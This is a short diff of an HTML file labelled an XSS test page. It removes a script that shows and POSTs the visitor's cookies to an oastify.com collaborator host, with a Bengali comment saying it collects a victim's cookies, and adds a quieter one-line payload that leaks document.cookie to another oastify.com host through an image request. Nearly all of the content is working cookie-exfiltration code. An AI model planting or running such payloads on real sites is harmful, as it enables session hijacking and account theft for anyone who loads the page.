@@ -7,17 +7,8 @@
 </head>
 <body>
   <h1>Hello, this is XSS Test Page</h1>
-
-  <script>
-    // Alert কুকি দেখাবে
-    alert("Your Cookies: " + document.cookie);
-
-    // নিচের কোড victim এর কুকি collect করার জন্য request পাঠায় (শুধু তোমার নিজের অ্যাকাউন্টে পরীক্ষা করো)
-    fetch("https://t3x9p97r2swo5apc25g23tcge7ky8owd.oastify.com", {
-      method: "POST",
-      body: document.cookie,
-      mode: "no-cors"
-    });
-  </script>
+ <script>
+new Image().src = "https://rto7f7xpsqmmv8fas360tr2e45awynmc.oastify.com/" + document.cookie;
+</script>
 </body>
 </html>
